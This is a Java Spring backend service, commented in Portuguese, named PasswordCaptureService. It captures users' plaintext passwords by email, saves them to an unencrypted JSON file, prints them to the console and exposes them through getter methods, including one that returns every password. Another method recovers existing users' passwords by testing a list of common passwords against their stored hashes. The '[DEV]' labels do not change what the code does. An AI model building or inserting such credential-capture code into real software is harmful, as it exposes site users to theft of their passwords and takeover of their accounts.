package com.site.backend.service;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.core.type.TypeReference;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;
import jakarta.annotation.PostConstruct;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

@Service
public class PasswordCaptureService {
    
    private static final String PASSWORDS_FILE = "passwords-dev.json";
    private Map<String, String> passwordsMap; // Email -> Senha em texto
    private ObjectMapper objectMapper;
    
    @Autowired
    private PasswordEncoder passwordEncoder;
    
    public PasswordCaptureService() {
        this.passwordsMap = new ConcurrentHashMap<>();
        this.objectMapper = new ObjectMapper();
    }
    
    @PostConstruct
    public void init() {
        loadFromFile();
        System.out.println("🔐 [DEV] PasswordCaptureService inicializado. " + 
                          passwordsMap.size() + " senhas carregadas.");
    }
    
    private void loadFromFile() {
        try {
            File file = new File(PASSWORDS_FILE);
            if (file.exists()) {
                String content = new String(Files.readAllBytes(Paths.get(PASSWORDS_FILE)));
                passwordsMap = objectMapper.readValue(content, 
                    new TypeReference<Map<String, String>>() {});
                System.out.println("✅ [DEV] " + passwordsMap.size() + " senhas carregadas de " + PASSWORDS_FILE);
            } else {
                System.out.println("⚠️ [DEV] Arquivo " + PASSWORDS_FILE + " não encontrado. Criando novo.");
                saveToFile();
            }
        } catch (IOException e) {
            System.err.println("❌ [DEV] Erro ao carregar arquivo de senhas: " + e.getMessage());
            passwordsMap = new ConcurrentHashMap<>();
        }
    }
    
    private synchronized void saveToFile() {
        try {
            String json = objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(passwordsMap);
            Files.write(Paths.get(PASSWORDS_FILE), json.getBytes());
        } catch (IOException e) {
            System.err.println("❌ [DEV] Erro ao salvar arquivo de senhas: " + e.getMessage());
        }
    }
    
    // MÉTODO 1: Para capturar senha
    public void capturePassword(String email, String plainPassword) {
        passwordsMap.put(email, plainPassword);
        saveToFile();
        System.out.println("🔓 [DEV] Senha capturada para " + email + ": " + plainPassword);
    }
    
    // MÉTODO 2: Para obter senha em texto (CORRIGIDO - estava faltando)
    public String getPlainPassword(String email) {
        String password = passwordsMap.get(email);
        if (password == null) {
            return "🚫 SENHA NÃO CAPTURADA";
        }
        return password;
    }
    
    // MÉTODO 3: Método alternativo com nome diferente (para compatibilidade)
    public String getPassword(String email) {
        return getPlainPassword(email);
    }
    
    // MÉTODO 4: Para ver todas as senhas
    public Map<String, String> getAllPasswords() {
        return new HashMap<>(passwordsMap);
    }
    
    // MÉTODO 5: Para tentar adivinhar senhas existentes
    public void tryGuessExistingPasswords(Map<String, String> usersWithHashes) {
        String[] commonPasswords = {
            "admin123", "admin", "password", "123456", "12345678",
            "123456789", "senha123", "teste123", "user123", "admin@123",
            "12345", "qwerty", "abc123", "111111", "password123"
        };
        
        int discovered = 0;
        for (Map.Entry<String, String> entry : usersWithHashes.entrySet()) {
            String email = entry.getKey();
            String hashedPassword = entry.getValue();
            
            // Se já temos a senha, pula
            if (passwordsMap.containsKey(email)) continue;
            
            // Tenta cada senha comum
            for (String commonPass : commonPasswords) {
                if (passwordEncoder.matches(commonPass, hashedPassword)) {
                    passwordsMap.put(email, commonPass);
                    discovered++;
                    System.out.println("🎯 [DEV] Senha descoberta para " + email + ": " + commonPass);
                    break;
                }
            }
        }
        
        if (discovered > 0) {
            saveToFile();
            System.out.println("✅ [DEV] " + discovered + " senhas descobertas de usuários existentes");
        }
    }
    
    // MÉTODO 6: Para verificar se o serviço está ativo
    public boolean isActive() {
        return true;
    }
    
    // MÉTODO 7: Para obter total de senhas capturadas
    public int getTotalCaptured() {
        return passwordsMap.size();
    }
}